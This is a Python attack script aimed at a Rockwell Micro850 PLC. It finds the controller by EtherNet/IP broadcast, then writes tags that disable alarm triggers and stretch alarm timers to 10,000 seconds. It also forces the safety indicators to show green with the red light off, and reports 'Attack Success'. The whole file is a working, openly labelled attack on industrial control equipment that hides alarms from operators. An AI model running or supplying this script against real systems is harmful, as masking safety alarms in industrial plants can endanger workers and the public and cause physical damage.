from scapy.all import *
from pycomm3 import CIPDriver
import time

# Function to find Rockwell PLC on the network
def find_rockwell_plc():
    print("[*] Scanning Network for Rockwell Micro850 PLC...")

    # Send an Ethernet/IP broadcast message
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                 IP(dst="255.255.255.255") /
                 UDP(sport=44818, dport=44818) /
                 Raw(load="\x63\x00\x00\x00"), timeout=5, verbose=False)

    for snd, rcv in ans:
        if b"Rockwell Automation" in rcv.load:
            plc_ip = rcv[IP].src
            print(f"[+] Detected Rockwell PLC at {plc_ip}")
            return plc_ip
    print("[-] No Rockwell PLC found on the network.")
    return None

# Function to modify alarm settings on the PLC using EtherNet/IP
def modify_alarm_settings(plc_ip):
    print(f"[*] Connecting to PLC at {plc_ip}...")

    try:
        with CIPDriver(f"ip://{plc_ip}") as plc:
            print("[+] Connected! Modifying Alarm Settings...")

            # Modify Tog_Off to disable certain alarms
            plc.write("Tog_Off", True)
            print("[+] Disabling Alarm Triggers...")

            # Manipulate Timer Off Parameters to suppress response
            plc.write("TONOFF_1.PTOF", "T#10000S")  # Set huge delay for alarm response
            plc.write("TONOFF_1.PT", "T#10000S")    # Set large delay for activation
            print("[+] Modified Timer-Off Values to Suppress Alarms.")

            # Modify Safety Lights (Indicators)
            plc.write("_IO_EM_DO_06", False)  # Ensure Red LED stays OFF
            plc.write("_IO_EM_DO_07", True)   # Force Green LED ON
            print("[+] Safety Indicators Modified.")

            print("[*] Attack Success: Alarm Reporting Suppressed.")

    except Exception as e:
        print(f"[-] Failed to modify PLC settings: {e}")

# Main Execution
if __name__ == "__main__":
    plc_ip = find_rockwell_plc()
    if plc_ip:
        modify_alarm_settings(plc_ip)